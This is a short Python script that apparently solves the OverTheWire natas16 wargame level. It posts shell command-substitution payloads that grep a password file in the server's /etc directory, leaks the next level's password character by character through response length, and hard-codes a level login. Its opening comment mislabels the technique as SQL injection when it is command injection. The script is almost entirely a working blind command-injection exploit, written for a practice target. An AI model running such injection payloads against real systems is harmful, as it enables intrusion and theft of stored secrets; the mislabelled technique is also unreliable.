#a true sql injection
import requests
from string import ascii_letters, digits


url='http://natas16.natas.labs.overthewire.org/'
auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
s=requests.Session()
nxt=ascii_letters+digits
pswd=""
while True:
    for c in nxt:
        trial=f'$(grep -E ^{pswd+c}.* /etc/natas_webpass/natas17)'
        resp=s.post(url,auth=auth, data={"needle":trial})
        if len(resp.text)==1105:
            pswd+=c
            print(len(pswd))#progress bar
            if len(pswd)==32:
                print(pswd)#knew this because i tried a and length(password)=32;# which exists
                exit(0)
